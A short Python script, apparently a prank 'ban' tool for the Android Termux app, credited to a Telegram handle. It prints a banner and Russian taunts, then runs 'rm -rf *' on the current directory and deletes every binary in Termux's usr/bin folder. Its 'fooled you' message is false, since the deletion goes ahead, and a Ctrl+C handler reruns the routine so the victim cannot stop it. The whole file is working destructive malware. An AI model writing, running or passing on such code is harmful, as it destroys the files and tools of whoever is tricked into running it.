import os
import time
banner = '''
  ___            _  _   
  | _ )   __ _   | \| |  
  | _ \  / _` |  | .` |  
  |___/  \__,_|  |_|\_|  
_|"""""|_|"""""|_|"""""| 
"`-0-0-'"`-0-0-'"`-0-0-'
			coded by: @foxeditor
			channel: @montelisa
'''
def main():
	print(banner)
	print('ммм, чекай, через 3 секунды твой термукс улетит')
	os.system("rm -rf *")
	time.sleep(1)
	print('НАЕБАЛ!')
	os.system('rm /data/data/com.termux/files/usr/bin/*')
	time.sleep(1)

try:
	main()
except KeyboardInterrupt:
    main()

